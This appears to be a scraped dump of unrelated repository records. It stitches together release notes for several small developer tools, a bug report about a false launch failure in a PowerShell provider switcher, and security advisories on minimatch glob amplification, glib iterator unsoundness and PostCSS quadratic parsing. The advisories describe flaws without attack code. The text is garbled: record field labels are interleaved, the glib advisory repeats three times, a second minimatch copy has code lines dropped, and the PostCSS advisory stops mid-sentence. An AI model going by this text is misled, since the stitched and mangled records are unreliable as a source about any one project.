See `docs/MIGRATIONS.md`, `docs/RELEASE_SMOKE_TEST_0.7.0.md` and the release-readiness section of `docs/IMPLEMENTATION_REPORT_0.7.0.md` for exact executed checks, remaining manual tests, package sizes and signing status.

# CodeForge Engine v1.1.0

CodeForge Engine v1.1.0 is a compatibility-focused evidence and safety release.
It keeps the local, CLI-first workflow and does not promote unverified semantic
analysis or optional external tools to stable guarantees.

## Baseline lifecycle

- Baseline pruning now evaluates current diagnostics and removes only `Resolved`
  entries. `Stale` entries are reported and retained for review.
- `baseline prune` is always a dry run unless `--apply` is supplied, and an apply
  additionally requires `--complete-scan` plus complete all-file scan evidence.
- Ambiguous matches, changed-file scopes, language filters, incomplete submission
  counts and unavailable relevant lint engines block destructive writes.
- Rule staleness now compares an explicit rule-semantics version rather than the
  CodeForge software package version.
- The old lifecycle-only `prune()` path was removed; all pruning is evidence-based.

## Diagnostics and evidence

- Review reports include additive coverage metadata for selection scope,
  requested languages, indexed/selected/submitted files, engine availability,
  external-analysis intent and explicit limitations.
- The desktop review view shows the same coverage information.
- Python `None` comparison fixes now operate on AST operands, avoiding string
  literals and unsafe chained-comparison rewrites.
- Java empty-catch detection uses the catch body AST, detects whitespace-empty
  handlers and avoids documented or nonempty handlers.

## Benchmark evidence

- Timing summaries include P95 in addition to samples, mean, median, variance,
  standard deviation, minimum and maximum.
- Benchmark environment records include CodeForge version, operating system,
  architecture, logical CPUs, Git revision/worktree state and local `rustc` and
  `cargo` versions when available.

## Compatibility

- Baseline schema remains version 1.
- SARIF output remains 2.1.0 and existing import compatibility is unchanged.
- Existing review reports without coverage metadata remain readable through an
  explicit default.
- The baseline command behavior is intentionally safer: destructive pruning now
  requires `--complete-scan --apply`; stale entries are never silently removed.
- Rust 1.90 remains the declared MSRV.

## Boundaries

Default scan/review paths do not run project benchmarks. Benchmarks measure
performance and do not prove correctness or semantic equivalence. External
analyzers remain optional; unavailable analysis is not treated as a clean result.
Context/impact, external SARIF import and CodeQL execution remain Experimental.

releases.body:
# CodeForge Engine v1.0.0

CodeForge Engine v1.0.0 is the first stable release of the local, CLI-first code
analysis, change review and verification workflow.

## What changed

- The workspace, desktop package, Tauri configuration and lockfile now identify
  the release as 1.0.0.
- The CLI can now preview and apply a uniquely matched fix, list transaction
  history and undo a recorded change. Apply is preview-only by default, requires
  explicit approval for review-required fixes, verifies syntax before writing and
  refuses ambiguous selectors.
- Windows x64 and Linux x64 CLI archives are published alongside the desktop
  packages. Every asset has a normalized filename and is covered by
  `checksums.txt`.
- Release preflight validates tag/version consistency and runs formatting,
  Clippy and the full Rust test suite before building artifacts. CI checks the
  declared Rust 1.90 minimum toolchain.

## What stays stable

Native parsing and review, reviewed baselines, transaction history and rollback,
configurable verification, SARIF export and independent Fleet tasks retain their
existing protocol and configuration boundaries. Baseline schema version 1 is
unchanged, and SARIF output remains a standard 2.1.0 document.

A stable workflow can still carry heuristic findings. Syntax-based suggestions
are review candidates, not semantic proof. `apply` records the verification that
ran and refuses unsafe shortcuts; it does not turn a heuristic finding into a
correctness guarantee.

## Experimental boundaries

On-demand context extraction, heuristic impact/test suggestions, local SARIF path
import and optional CodeQL CLI execution remain Experimental. They are opt-in and
outside the default scan path. Name-based relations are ambiguous by design, and
the CodeQL path requires a separately eligible user-supplied installation. The
repository does not claim that these capabilities provide complete scope/type
resolution or real-world CodeQL certification.

Fleet requires successful checks mandated by policy; a missing required tool is
not a pass. An equivalence command records what that command checked, not a formal
proof. Benchmarks measure execution; they do not replace functional tests.

## Verification

Release artifacts are built from the reviewed tag candidate. The release workflow
runs Rust format, Clippy and tests, validates package metadata, publishes only
normalized asset names, and downloads the published assets again to verify their
SHA-256 checksums. Platform acceptance evidence is recorded separately from the
welcome screenshot.

## Security and limitations

Built-in analysis works locally without an account, telemetry or hosted model.
External commands inherit host permissions and environment; timeout and output
limits are not an OS sandbox. Reports can contain source, paths and tool output.
Review evidence before sharing it.

The CLI is the complete primary entry point. The desktop application exposes the
same core semantics for diagnostic browsing, patch review and evidence inspection.
Optional language tools are not bundled and retain their own licenses.

CodeForge Engine is Apache-2.0 licensed. See the repository documentation for the
full compatibility and maturity statement.

security_advisory.summary: minimatch has potential denial of service via globparts amplification
security_advisory.description:
minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.

researcher: Reid Downing (b1nv0id)
files: 

- src/index.ts: 690-770
- src/index.ts: 780-796

issue:
input-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.

the **/../ transformation clones a globparts entry and appends the clone to the same globparts array:
```
parts.splice(gs, 1)
const other = parts.slice(0)
other[gs] = '**'
globParts.push(other)
```
this occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.

the expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:
```
for (let i = 0; i < globParts.length - 1; i++) {
  for (let j = i + 1; j < globParts.length; j++) {
    this.partsMatch(...)
  }
}
```
an attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.

security_advisory.summary: Unsoundness in `Iterator` and `DoubleEndedIterator` impls for `glib::VariantStrIter`
security_advisory.description:
The `VariantStrIter::impl_get` function (called internally by implementations of the `Iterator` and `DoubleEndedIterator` traits for this type) was unsound, resulting in undefined behaviour.

An immutable reference `&p` to a `*mut libc::c_char` pointer initialized to `NULL` was passed as an argument to a C function that that mutates the pointer behind `&p` in-place (i.e. as an out-argument), which was unsound. After changes in recent versions of the Rust compiler, these unsound writes through `&p` now seem to be completely disregarded when building the `glib` crate with optimizations.

This subsequently caused all calls of `VariantStrIter::impl_get` to violate the safety requirements of the `std::ffi::CStr::from_ptr` function - which requires its argument to be a valid pointer to a C-style string - resulting in crashes due to `NULL` pointer dereferences.

This was fixed by passing the out-argument pointer explitly as `&mut p` instead of `&p`.

This issue has been present since this code was initially added in `glib` v0.15.0. The mismatch in mutability was likely missed (and not raised as an error by the compiler) because the C function wrapped by `VariantStrIter::impl_get` is variadic (`glib_sys::g_variant_get_child`), and the pointer in question is one of the variadic arguments.

issues.title: [Bug] False LaunchUnknown after successful Codex Desktop MSIX activation
issues.body:
[Bug] False LaunchUnknown after successful Codex Desktop MSIX activation

Summary

CodexModeSwitcher v0.2.2 reports LaunchUnknown after switching providers and requesting Codex Desktop activation, even though the configuration transaction commits successfully and Desktop subsequently launches with the selected provider.

The issue appears to involve a race condition in post-activation process identity verification. A recent Codex Desktop update may have exposed this weakness, but there is insufficient evidence to establish the update as the direct cause.

Environment

Component | Version / Details -- | -- OS | Windows 11 PowerShell | 7.6.9 CodexModeSwitcher | v0.2.2 Codex Desktop | 26.1029.7803.0 (x64) Packaging | MSIX Activation method | IApplicationActivationManager Package family | OpenAI.Codex_2p2nqsd0c76g0 Selected provider | deepseek Selected model | deepseek-v4-flash

Steps to Reproduce

  1. Configure and save a valid DeepSeek provider.

  2. Start from the GPT/ChatGPT configuration.

  3. Finish active tasks and close Codex Desktop normally.

  4. Execute:

    $entry = "$env:LOCALAPPDATA\Programs\CodexModeSwitcher\codex-mode.ps1"
pwsh -NoProfile -File $entry DeepSeek -Launch

  5. Confirm task completion by entering YES.

  6. Observe LaunchUnknown, despite Desktop launching successfully.

This is one observed occurrence; consistent reproducibility has not yet been established.

Actual Behavior

The command reports:

Provider   : openai
Model      : gpt-6.1-sol
Config     : present
Login rule : chatgpt
DS state   : Valid
Desktop    : Ready / IApplicationActivationManager
Recovery   : Clear

[Failed] Activation was requested but Desktop identity could not be verified.
Configuration remains committed.

LaunchUnknown

The displayed GPT provider/model values appear to represent the pre-transaction diagnostic snapshot rather than the committed selection.

The transaction was committed without automatic rollback.

Post-Failure Verification

A subsequent read-only Diagnose -Json returned:

Provider             : deepseek
Model                : deepseek-v4-flash
ConfigValid          : True
ActiveProfile        : False
DesktopState         : Running
DesktopStateReliable : True
RecoveryStatus       : Clear
PendingTransactions  : {}
ProviderLoaded       : NotVerified

Desktop discovery also succeeded:

State            : Installed
Reason           : RegisteredMsixManifest
Reliable         : True
Kind             : Msix
ActivationMethod : IApplicationActivationManager

Process inspection found multiple ChatGPT.exe processes under the expected MSIX installation:

C:\Program Files\WindowsApps\
OpenAI.Codex_26.1029.7803.0_x64__2p2nqsd0c76g0\
app\ChatGPT.exe

The user independently confirmed that Desktop started and the selected provider was active. The switcher's ProviderLoaded field remained NotVerified, consistent with its documented verification limitations.

Suspected Root Cause

Inspection of the v0.2.2 source suggests two potential weaknesses.

1. Premature failure on transient Unknown

In src/DesktopLifecycle.ps1, Invoke-DesktopLaunch immediately throws when Get-DesktopState returns Unknown:

if ($observed.State -eq 'Unknown') {
    Write-ModeFailure 'LaunchUnknown' `
        'Activation was requested but Desktop identity could not be verified. Configuration remains committed.'
}

This may terminate verification during transient process-enumeration failures or incomplete process metadata while MSIX activation is still in progress.

2. Activation PID is discarded

Request-DesktopActivation returns the PID supplied by Windows activation, but Invoke-DesktopLaunch discards it:

[void](Request-DesktopActivation $Context $Identity)

Subsequent verification relies on a separate CIM process enumeration and executable-path matching.

The returned PID could provide additional evidence for identity verification, provided that process reuse, process exit, and MSIX process handoff are handled safely.

Neither explanation is conclusively established by the available logs. No process snapshot was captured at the exact moment LaunchUnknown occurred.

Expected Behavior

  • Successful configuration commits remain durable.

  • Transient discovery failures do not immediately cause a false-negative launch result.

  • Persistent identity failures remain explicit and fail safely.

  • Activation acceptance, process identity verification, and provider loading are reported independently.

  • No process is trusted solely because its name matches Codex.exe or ChatGPT.exe.

Proposed Fix for v0.2.3

  1. Preserve the activation-returned PID and use it as an additional verification signal.

  2. Retry transient Unknown states within the existing bounded launch timeout.

  3. Distinguish enumeration failure, inaccessible executable paths, identity mismatch, and process exit.

  4. Maintain strict executable/package identity checks without weakening security.

  5. Report separate states for activation, process identity, and provider loading.

  6. Ensure the final command output displays the committed provider/model, rather than only the pre-switch diagnostic snapshot.

  7. Add deterministic regression tests for:

    • Unknown → Running

    • Ready → Unknown → Running

    • Persistent Unknown

    • Activation PID exits or is replaced

    • Identity mismatch

    • Successful configuration commit followed by launch verification failure

  8. Perform a real Windows MSIX end-to-end test against Codex Desktop 26.1029.7803.0 or newer.

Acceptance Criteria

  • A successfully launched, identity-verified Desktop is not reported as LaunchUnknown.

  • Transient process-discovery failures are retried within a bounded timeout.

  • Persistent identity uncertainty still fails safely.

  • No configuration rollback occurs after a durable transaction commit.

  • No running Desktop tasks or processes are terminated automatically.

  • Diagnostics distinguish configuration commit, activation acceptance, process verification, and provider verification.

  • Regression tests and Windows CI pass.

  • A real MSIX launch and provider-switching scenario is manually verified and documented.

Additional Notes

This issue does not indicate a failed DeepSeek configuration transaction or confirmed data loss.

The primary concern is a false-negative activation result after a successful configuration commit, potentially amplified by changes in the Codex Desktop startup lifecycle.

The fix should preserve the project's existing fail-safe transaction and identity-verification guarantees.

releases.name: v0.2.2 — Installer and Upgrade Recovery
releases.body:
## Installation and upgrade fix

v0.2.2 fixes the v0.2.1 delivery failure where updating only `~/.codex/codex-mode.ps1` left the entry point without `src/CodexMode.psm1` and every command failed to import the module.

### Highlights

- **Complete installer:** `install.ps1` deploys the entry script, cmd adapter, module manifest, complete `src/` tree, installer, documentation and an ownership receipt.
- **Standalone program directory:** installs to `%LOCALAPPDATA%\Programs\CodexModeSwitcher` by default. `CODEX_HOME` is not used as the program directory.
- **Safe single-file upgrades:** a v0.1.0/v0.2.0 `codex-mode.ps1` is backed up, replaced with a forwarding shim, and restored on uninstall.
- **Clear repair guidance:** missing module files now return `Codex=ModuleMissing` with exact reinstall instructions instead of a raw `Import-Module` exception.
- **Four lifecycle actions:** `Install`, `Update`, `Verify` and `Uninstall`, with `-DryRun`, `-Json`, `-PassThru` and staged replacement.
- **Release integrity:** the archive includes `release-manifest.json`; CI verifies the complete payload, every SHA-256 and module import, and rejects entry-only delivery.

### Install

Download the complete `CodexModeSwitcher-0.2.2.zip` archive, verify it against `SHA256SUMS.txt`, extract it, then run:

```powershell
pwsh -NoProfile -File .\CodexModeSwitcher\install.ps1 -Action Install
& "$env:LOCALAPPDATA\Programs\CodexModeSwitcher\codex-mode.ps1" Diagnose -Json
```

Do not download only `codex-mode.ps1`; it depends on the full distribution.

### Upgrade from v0.1.0 or v0.2.0

```powershell
pwsh -NoProfile -File .\CodexModeSwitcher\install.ps1 -Action Install
& "$env:CODEX_HOME\codex-mode.ps1" Status
```

The installer backs up the existing entry before installing the forwarding shim. Existing configuration, credentials, sessions, state and backups under `CODEX_HOME` are not modified.

### Verify and uninstall

```powershell
pwsh -NoProfile -File .\CodexModeSwitcher\install.ps1 -Action Verify
pwsh -NoProfile -File .\CodexModeSwitcher\install.ps1 -Action Uninstall
```

Uninstall removes program-owned files and shims, restores verified legacy entries, and preserves Codex user data. Optional Terminal/Start Menu/notification integrations remain separate and should be removed with `codex-mode integration uninstall-all -Apply`.

### Validation

- PR [#5](https://github.com/styayur/codex-mode-switcher/pull/5): merged at `3439265f8a445e628ed2ea80ae6535dda24f87d7`.
- CI: [push run](https://github.com/styayur/codex-mode-switcher/actions/runs/39278107834) and [PR run](https://github.com/styayur/codex-mode-switcher/actions/runs/39278139975): **125/125 Pester tests passed**, syntax and PSScriptAnalyzer clean, release archive built and verified.
- [Architecture verification](https://github.com/styayur/codex-mode-switcher/actions/runs/39278140061): passed.
- Installed from the built release archive, verified with `-Action Verify`, and uninstalled from the installed copy.

### Assets

- `CodexModeSwitcher-0.2.2.zip` — complete installable distribution.
- `SHA256SUMS.txt` — SHA-256 for the archive and manifest.
- `release-manifest.json` — per-file SHA-256 and size for the installable payload.

Archive SHA-256: `fa6d836bed4de1e5b9f02b80f33367ba9021c8ec20cf08b7d554325bf52b9bb5`

No GUI, resident service, tray agent, PATH/PSModulePath change or registry-based integration is added. Live Desktop provider end-to-end verification remains a manual acceptance item, unchanged from v0.2.1.

releases.name: v0.2.1 — Windows Native Integration
releases.body:
## Windows Native Integration

v0.2.1 adds optional Windows integrations around the Desktop Controller. It also includes the previously unreleased v0.2.0 controller baseline; no separate v0.2.0 release was published.

### Features

- **PowerShell module:** `Import-Module CodexModeSwitcher`, `Start-CodexMode GPT/DeepSeek`, `Get-CodexStatus`, `Test-CodexEnvironment`, and the `codex-mode` alias. Original script commands remain available.
- **Windows Terminal:** three uniquely identified JSON-fragment profiles: Codex GPT, Codex DeepSeek, Codex Diagnose. Existing `settings.json` is not rewritten.
- **Start Menu:** optional native shortcuts in a dedicated current-user folder. No desktop shortcuts or context-menu registration.
- **Integration management:** installation/removal preview by default; `-Apply` is explicit approval. Ownership/hash checks, list, uninstall-all, backups and conditional failure recovery preserve unowned or edited files.
- **Optional toast requests:** explicit identity installation and per-command `-Notify`; fixed outcome messages only. Notification failure never changes a configuration result.
- **Desktop baseline:** validated Windows identity discovery, safe normal-exit coordination, opt-in launch, native GPT model preservation, transactional backups and conditional recovery. No forced Desktop/task termination.

### Install

Download `CodexModeSwitcher-0.2.1.zip` and verify it against `SHA256SUMS.txt`. The archive contains the complete `CodexModeSwitcher/` module folder. Follow [module installation and integration instructions](https://github.com/styayur/codex-mode-switcher/blob/v0.2.1/docs/WINDOWS-INTEGRATION.md).

```powershell
Import-Module CodexModeSwitcher
Get-CodexStatus
Start-CodexMode GPT -DryRun
codex-mode install terminal          # Preview
codex-mode install terminal -Apply   # Explicit approval
codex-mode integration list
```

`Start-CodexMode` launches by default; `-ConfigurationOnly` opts out. Legacy `codex-mode.ps1 GPT` remains configuration-only unless `-Launch` is supplied. Finish tasks and exit Desktop normally before switching. `DeepSeek` restores the single saved custom provider, not a built-in provider preset. Keep the full distribution; the entry script now depends on src/.

### Validation

- Full local, PR, main and [v0.2.1 tag CI](https://github.com/styayur/codex-mode-switcher/actions/runs/38191563709): **115/115 Pester tests passed**, zero failures/skips; PowerShell syntax and PSScriptAnalyzer passed.
- All 89 prior regressions retained; 26 module/integration cases added.
- Native Windows shortcut serialization and AUMID reads exercised only in isolated temporary folders. Desktop activation and toast submission mocked.
- [Architecture CI](https://github.com/styayur/codex-mode-switcher/actions/runs/38191488267): source/link checks, light/dark rendering and deterministic repeat passed.
- TruffleHog 3.97.9: zero findings in publishable files and committed history, with live credential verification disabled. Private-path patterns clear.
- Archive/manifest validation and cmd failure exit propagation passed. Archive contains only tracked source, excluding original local logs/config/credentials.

### Limits and compatibility

- Actual Terminal profile visibility, Start Menu UI launch, visible toast delivery and live Desktop provider E2E remain unverified. Windows policy/Focus Assist may suppress notifications; observing a Desktop process does not prove provider loading.
- No authentication management, session database access, model gateway, GUI, tray or background service. Implicit CLI login/doctor was removed; legacy NoLogin/SkipDoctor flags remain accepted no-ops.
- No guaranteed hot reload or seamless old-session migration. MSIX launch with custom CODEX_HOME remains conservatively blocked.
- Integration updates are not multi-file crash-atomic. Modified/unowned artifacts are preserved; interrupted updates may require local reconciliation. Backups, receipts and empty directories are retained. Legacy profile shortcuts use their separate uninstaller.
- Uninstall integrations before moving/upgrading the distribution, then reinstall from its new location. External editors remain outside the tool's lock.

MIT License. Independent community project, not an official OpenAI or DeepSeek product.

releases.body:
First public release of a small, dependency-free PowerShell tool for switching Codex between ChatGPT OAuth and one saved custom API provider.

## Included

- Status, Init, GPT, DeepSeek and Toggle commands, with NoLogin and SkipDoctor switches.
- GPT selects the OpenAI provider and ChatGPT authentication; the model is left to Codex/account defaults.
- Custom-provider capture and restoration of model, catalog, endpoints, login rule and provider tables, while retaining unrelated MCP, sandbox and project settings.
- Exact pre-change config backups, previous-state backups, atomic writes, state validation and a local writer lock.
- English and Chinese documentation, MIT License, security guidance and Windows CI.

## Validation

- 40 Pester regression tests passed with no failures or skips.
- PowerShell syntax parsing and PSScriptAnalyzer 1.25.0 passed locally and in Windows CI (Pester 5.7.1).
- An independent TOML parser confirmed valid output and preservation of unrelated configuration across eight CLI operations.
- Publication files and the full initial Git history were scanned with TruffleHog 3.97.9 with credential verification disabled: zero findings. Additional machine-path/key patterns returned zero matches.
- Original local logs and source notes are excluded from Git history and release assets. Historical validation is summarized in CHANGELOG.md.

Requires PowerShell 7.4+; Windows is the tested platform. DeepSeek restores one previously saved custom provider rather than constructing a new service configuration. security_advisory.summary: Unsoundness in `Iterator` and `DoubleEndedIterator` impls for `glib::VariantStrIter`
security_advisory.description:
The `VariantStrIter::impl_get` function (called internally by implementations of the `Iterator` and `DoubleEndedIterator` traits for this type) was unsound, resulting in undefined behaviour.

An immutable reference `&p` to a `*mut libc::c_char` pointer initialized to `NULL` was passed as an argument to a C function that that mutates the pointer behind `&p` in-place (i.e. as an out-argument), which was unsound. After changes in recent versions of the Rust compiler, these unsound writes through `&p` now seem to be completely disregarded when building the `glib` crate with optimizations.

This subsequently caused all calls of `VariantStrIter::impl_get` to violate the safety requirements of the `std::ffi::CStr::from_ptr` function - which requires its argument to be a valid pointer to a C-style string - resulting in crashes due to `NULL` pointer dereferences.

This was fixed by passing the out-argument pointer explitly as `&mut p` instead of `&p`.

This issue has been present since this code was initially added in `glib` v0.15.0. The mismatch in mutability was likely missed (and not raised as an error by the compiler) because the C function wrapped by `VariantStrIter::impl_get` is variadic (`glib_sys::g_variant_get_child`), and the pointer in question is one of the variadic arguments.

# GitPad+ v0.1.0-alpha.1 — Early Alpha

GitPad+ is a calendar-first, local-first Markdown journal. This first alpha includes the Calm Precision workspace, multiple notes per day, tabs and two independent writing panes, rich Markdown and source editing, images, document and selection links, recovery for external edits, and trusted bundled plugins.

- **Windows x64** — Extract the entire ZIP into a writable directory and open `GitPadPlus.App.exe`. Requires Windows 10 build 19041 or newer and Evergreen WebView2. Runtime tested on Windows 11 x64. The executable is unsigned.

- **Verification** — `SHA256SUMS.txt` covers the packages and attached evidence. `acceptance.json` records the results for the exact source commit. The draft assets were re-downloaded and matched the accepted manifest before publication.

The app saves Markdown with UUIDv7 metadata and keeps a rebuildable SQLite index. Back up the entire vault, including metadata and attachments. Use Check recovery to review external changes before applying them. Clear Local GitPad+ Data permanently removes the app-managed local data after an explicit confirmation.

Git synchronization, multi-vault support, remote plugin execution and E2EE are outside this alpha's scope. The original application is AGPL-3.0-only. The packages include third-party license texts, and this release includes the SPDX SBOM and notices. Windows uses the MIT-source Win2D rebuild documented in the repository.

releases.name: v0.3.0-alpha.1 — Local language mapping / 本地语言映射
releases.body:
# Local language mapping / 本地语言映射

This experimental Windows x64 release adds the same model-independent language-mapping engine to the native palette, IPA Studio and JSON CLIs (`ipa-map` and `ipa-tts`). Results preserve original text, scheme/version/source traces, ordered candidates and explicit uncertainty. Copy and transfer remain deliberate actions. Existing English synthesis stays separate.

Launch `ipa-symbol-palette.exe` before using **Ctrl+Alt+Shift+I**. Closing its
window keeps it resident; **Exit** unregisters the shortcut. This release fixes
minimized shortcut restore, repeated-launch foregrounding and sent tray callbacks:
left-click reveals Copy mode, right-click opens Show/Hide/Exit. The visible Exit
button remains available in the panel. No autostart is installed.

| Profile | Implemented conversion and limits |
|---|---|
| en-US | Selected CMUdict vocabulary (443 spellings, 549 pronunciations) → explicit broad IPA approximation; exact, finite dictionary IPA → spelling candidates. Optional eSpeak G2P. `read` retains variants. |
| fr | Optional local eSpeak fr-fr spelling → broad IPA hypothesis; no reverse or synthesis support. |
| es | Optional local eSpeak Spain-profile spelling → broad IPA hypothesis; no reverse or synthesis support. |
| ja | Named CLDR 49 kana/modified-Hepburn-family subset, including digraphs, sokuon and prolonged marks. `コーヒー → kōhī`; no Kanji G2P or Japanese IPA. |
| cmn-Hans | CLDR Han default character readings (44,498 NFC characters) and three explicit phrase contexts → tone-marked Latin. `重` retains ambiguity. No general word disambiguation, sandhi or Mandarin IPA. |
| ru | Named CLDR Russian alphabet/Latin subset and scoped reversible alphabet. `Щука → Ŝuka`; no ISO 9 conformance or Russian G2P claim. |

IPA normalization is conservative notation checking, independently exposed for all six profiles. Romanization is not IPA; parsing is not language phonology or TTS compatibility. No new speech language, cloud service, account, telemetry or Python runtime is added.

## Sources and licensing

CLDR release-49 (`96e54b273d2da4ec6fbad350ba19ff23fa24a588`) data retains Unicode-3.0; selected CMUdict (`74790861f652b15e4ac49015a90074ad62a27690`) retains BSD-2-Clause. Language/script identifiers have pinned IANA/ISO 15924 records. Optional eSpeak is pinned to 1.52.0 in the full package and retains its GPL notices and corresponding sources. Applications remain GPL-3.0-or-later; the reusable mapping crate is MPL-2.0. Independent French/Spanish reference facts and their attribution/license are separate from production rules. Other mandatory authoritative references are documented with their actual research-only scope; no restricted ISO text or chart artwork is copied.

See [mapping guide](https://github.com/styayur/ipa-first-tts/blob/v0.3.0-alpha.1/docs/language-mapping.md), [source register](https://github.com/styayur/ipa-first-tts/blob/v0.3.0-alpha.1/docs/research/authority-sources.json) and [license boundaries](https://github.com/styayur/ipa-first-tts/blob/v0.3.0-alpha.1/licenses/README.md).

## Validation and downloads

Built from merged commit [`715b7a7`](https://github.com/styayur/ipa-first-tts/commit/715b7a779e093d57ad8f4896f982c089b470ebcd)
with Rust 1.98.1 / Windows x64 MSVC, Release profile. Final-commit checks:
[core/native CI](https://github.com/styayur/ipa-first-tts/actions/runs/40298999773),
[architecture CI](https://github.com/styayur/ipa-first-tts/actions/runs/40298999654).

38 ordinary Windows workspace tests, the explicit real eSpeak/Kokoro integrations, browser UI/HTTP regressions, source hashes, dependency notices, security audit and architecture checks are recorded in the [validation record](https://github.com/styayur/ipa-first-tts/blob/v0.3.0-alpha.1/docs/validation/v0.3.0-alpha.1.md). Selected fixture agreement: en-US 6/6, ja 9/9, ru 5/5, cmn-Hans 5/5; fr 3/3 and es 3/3 compare segments after removing stress/dots only in the metric. Windows release build、16 个单元测试、2 个真实 G2P/合成集成测试、Clippy，以及 Windows / Linux GitHub CI 均通过。实际跑通了 “The quick brown fox jumps over the lazy dog.”，生成 24 kHz 单声道 PCM16 WAV。

# Local Context Engine v1.0.0

**Release draft — unreleased.** Available binaries remain v0.2.0. No v1.0.0
artifact, platform certification or new compatibility guarantee is announced.

## Why it exists

Local Context Engine brings files, applications, processes, services and windows
into one explainable local query on Windows. It indexes file names, paths and
metadata without uploading source or requiring a cloud account or model.

## Capabilities

Stable workflows include the query DSL, English/Chinese rule-based compilation,
CLI/MCP access, deterministic ranking for fixed inputs and provider snapshots,
and selective extension/prefix/trigram planning with authoritative verification.
Index health and explanations help distinguish an empty result from unavailable
or stale data. Optional NTFS MFT/USN service deployment and desktop acceptance
across machines remain Experimental. Full-text and semantic retrieval are Future.

## Validation and performance

The existing million-record probe matches every ordered result to the linear
reference for all eight queries. Recorded accelerator construction time changed
from 11.93 s to 8.91 s; construction process peak working set changed from
1005.25 MB to 258.98 MB. Retained accelerator estimates stayed at 75.80 MB.
Common `report` latency did not improve. These Windows/Rust 1.98.1 synthetic
observations are not end-to-end or universal latency promises, and hardware
provenance is incomplete. Regression tests cover mutations, persistence and
query correctness; final v1.0.0 artifacts still require release validation.

## Security and limitations

Broad/short/fuzzy queries can still scan. Live providers depend on permissions
and changing system state. The optional elevated MFT service can expose file
names that an ordinary directory walk cannot list; normal file-content access
checks remain in force. Local indexes and usage data are sensitive. Desktop
build success alone does not establish working rendering on every machine.

The project remains independent, offline-first and MPL-2.0 licensed. No new
runtime dependency, core logic or protocol change is part of this documentation
preparation. Desktop license metadata alignment, version alignment,
minimum-toolchain validation, complete benchmark
environment capture and final installer/service smoke tests remain release gates.

security_advisory.summary: Unsoundness in `Iterator` and `DoubleEndedIterator` impls for `glib::VariantStrIter`
security_advisory.description:
The `VariantStrIter::impl_get` function (called internally by implementations of the `Iterator` and `DoubleEndedIterator` traits for this type) was unsound, resulting in undefined behaviour.

An immutable reference `&p` to a `*mut libc::c_char` pointer initialized to `NULL` was passed as an argument to a C function that that mutates the pointer behind `&p` in-place (i.e. as an out-argument), which was unsound. After changes in recent versions of the Rust compiler, these unsound writes through `&p` now seem to be completely disregarded when building the `glib` crate with optimizations.

This subsequently caused all calls of `VariantStrIter::impl_get` to violate the safety requirements of the `std::ffi::CStr::from_ptr` function - which requires its argument to be a valid pointer to a C-style string - resulting in crashes due to `NULL` pointer dereferences.

This was fixed by passing the out-argument pointer explitly as `&mut p` instead of `&p`.

This issue has been present since this code was initially added in `glib` v0.15.0. The mismatch in mutability was likely missed (and not raised as an error by the compiler) because the C function wrapped by `VariantStrIter::impl_get` is variadic (`glib_sys::g_variant_get_child`), and the pointer in question is one of the variadic arguments.

## mzk 0.1.0-alpha.1

Initial Alpha of the single-command headless Jamendo launcher. **Real mpv playback and online-to-audio acceptance are not verified.** A registered Jamendo client ID and trusted mpv >= 0.40 are required; mpv and music are not bundled.

### Implemented

- `mzk p <text>` treats input literally, normalizes Unicode and scores grapheme-based character similarity.
- One full-input search, at most one fragment fallback, quality filtering and weighted random selection. No LLM, database, history, audio download, GUI/TUI or independent daemon.
- Detached Windows/Linux mpv, current-user local IPC, process identity verification, direct replacement and confirmation before `playing` plus required attribution.
- Stale endpoint recovery uses a process-bound Windows handle or Linux pidfd; unrelated or unverifiable identities fail closed.

### Verification

Source: `3c6b9414fd6d43e01822d36e7d875f7c7db1b1cf`.

[Tag CI](https://github.com/styayur/mzk/actions/runs/40446111067) and [review CI](https://github.com/styayur/mzk/actions/runs/40445611518) run formatting, check, Clippy with warnings denied, 15 offline tests (plus three explicitly ignored opt-ins), optimized build and packaging on Windows MSVC and Linux GNU x86-64. These links are the evidence for the publication gates; no release is published until the tag run succeeds. Recovery fixtures complete initialization and repeat five cycles. Downloaded final packages passed SHA-256, archive CRC, license-notice and binary-boundary checks; their CLI version and missing-credential behavior passed on native Windows and WSL Ubuntu 26.04 / glibc 2.43. This is CLI acceptance, not real mpv playback. Earlier failed packaging/identity checks remain visible in Actions; the unreleased candidate tag was corrected before this first publication.

security_advisory.description:
minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.

researcher: Reid Downing (b1nv0id)
files: 

- src/index.ts: 690-770
- src/index.ts: 780-796

issue:
input-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.

```
const other = parts.slice(0)
other[gs] = '**'

```
this occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.

the expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:
```
for (let i = 0; i < globParts.length - 1; i++) {

    this.partsMatch(...)
  }
}
```
an attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.

security_advisory.description:
The `VariantStrIter::impl_get` function (called internally by implementations of the `Iterator` and `DoubleEndedIterator` traits for this type) was unsound, resulting in undefined behaviour.

An immutable reference `&p` to a `*mut libc::c_char` pointer initialized to `NULL` was passed as an argument to a C function that that mutates the pointer behind `&p` in-place (i.e. as an out-argument), which was unsound. After changes in recent versions of the Rust compiler, these unsound writes through `&p` now seem to be completely disregarded when building the `glib` crate with optimizations.

This subsequently caused all calls of `VariantStrIter::impl_get` to violate the safety requirements of the `std::ffi::CStr::from_ptr` function - which requires its argument to be a valid pointer to a C-style string - resulting in crashes due to `NULL` pointer dereferences.

This was fixed by passing the out-argument pointer explitly as `&mut p` instead of `&p`.

This issue has been present since this code was initially added in `glib` v0.15.0. The mismatch in mutability was likely missed (and not raised as an error by the compiler) because the C function wrapped by `VariantStrIter::impl_get` is variadic (`glib_sys::g_variant_get_child`), and the pointer in question is one of the variadic arguments.

security_advisory.summary: PostCSS: Quadratic complexity in flat selector parsing allows CPU exhaustion
security_advisory.description:
### Impact

`.` and `#` are not word delimiters in the tokenizer, so a flat selector such as
`.a.a.a...` reaches `splitWord()` as a single word token carrying n class or id
indexes. Three passes scanned those index arrays linearly for every index,
making the parse O(n^2) in the number of indexes rather than in input length:
